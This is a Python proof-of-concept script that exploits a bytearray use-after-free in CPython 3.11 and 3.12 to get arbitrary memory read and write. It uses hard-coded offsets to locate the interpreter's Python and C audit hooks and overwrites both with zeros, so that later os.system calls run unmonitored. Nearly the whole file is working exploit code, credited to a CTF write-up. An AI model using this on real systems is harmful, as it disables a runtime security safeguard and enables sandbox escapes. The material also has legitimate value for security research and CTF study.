#!audit_hook_head_finder

# sys for version check
import os, sys
from audit_hook_head_finder import add_audit

# ONLY TESTED ON PYTHON 3.12 and 3.11
# the offsets are from POC-no-ctypes-native.py
# the first two are ptr offsets
# the third is the offset to get the audit hook set by python
# the fourth is the offset to get the audit hook set by C
if sys.version_info[:2] == (3, 12):
    if sys.version_info[2] <= 3:
        PTR_OFFSET = [24, 48, 0x468f0, -0xc948] # <= 3.12.3
    else:
        PTR_OFFSET = [24, 48, 0x46920, -0xc948] # for python3.12.4
else:
    # there are multiple offsets for 3.11? check the result of POC-no-ctypes.py
    PTR_OFFSET = [24, 48, 0x4d558, 0x3e3d0]

add_audit()
sys.addaudithook((lambda x: lambda *args: x("audit hook triggered!", args))(print))

os.system("echo 'test audit hook -- this will trigger hook'")

# get addr from str helper func
getptr = lambda func: int(str(func).split("0x")[-1].split(">")[0], 16)

# following arbitery reading/writing exploit code from https://maplebacon.org/2024/02/dicectf2024-irs/
# improved by Maple Bacon
class UAF:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = UAF()
# end of arbitery writing exploit code

# any function works here theoretically
ptr = getptr(os.system.__init__) + PTR_OFFSET[0]
ptr = int.from_bytes(memory[ptr:ptr + 8], 'little') + PTR_OFFSET[1]

audit_hook_by_py = int.from_bytes(memory[ptr:ptr + 8], 'little') + PTR_OFFSET[2]
audit_hook_by_c = int.from_bytes(memory[ptr:ptr + 8], 'little') + PTR_OFFSET[3]
memory[audit_hook_by_py:audit_hook_by_py + 8] = [0] * 8
memory[audit_hook_by_c:audit_hook_by_c + 8] = [0] * 8

os.system("echo 'test audit hook -- this will not'")